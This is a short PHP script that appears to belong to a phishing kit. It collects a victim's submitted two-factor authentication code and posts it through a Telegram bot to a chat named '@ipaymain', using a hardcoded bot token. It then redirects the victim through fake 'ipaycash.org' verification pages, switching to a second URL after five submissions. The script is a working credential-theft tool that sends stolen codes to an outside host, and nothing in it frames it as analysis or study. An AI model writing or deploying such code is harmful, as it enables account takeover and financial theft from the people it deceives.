<?php
session_start(); // Start the session to keep track of submissio



if (isset($_POST['combinedCode'])) {
    $combinedCode = $_POST['combinedCode'];

    // Validate the combined code to ensure it's numeric
    if (!ctype_digit($combinedCode)) {
        echo "Error: The code must be numeric.";
        exit(); // Stop further script execution
    }

$tmain = 'Your 2FA code is: ' . $combinedCode;


$apiToken = "6906329824:AAFbkdYIoP3j7DQE_kQhWeBYq7jvEsnuCuM";
    $data = [
        'chat_id' => '@ipaymain', 
        'text' => $tmain
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

    header("Location: $primaryRedirectionUrl");
}
// The primary redirection URL
$primaryRedirectionUrl = "https://ipaycash.org/trade/Or124t3oQ5/2fa-verification/";

// The alternative redirection URL after reaching the limit
$alternativeRedirectionUrl = "https://ipaycash.org/trade/Or124t3oQ5/";

// Initialize or increment the redirection counter
if (!isset($_SESSION['redirection_count'])) {
    $_SESSION['redirection_count'] = 0; // Initialize to zero if not set
}

$_SESSION['redirection_count'] += 1; // Increment the counter on each redirection

// Check the redirection count
if ($_SESSION['redirection_count'] >= 5) {

        // Clear the session before redirecting to the alternative URL
        session_unset(); // Unset all session variables
        session_destroy(); // Destroy the session
    // Redirect to the alternative URL after 5 times
    header("Location: $alternativeRedirectionUrl");
} else {
    // Redirect to the primary URL if the limit has not been reached
    header("Location: $primaryRedirectionUrl");
    
}

exit(); // Stop further script execution after redirection

?>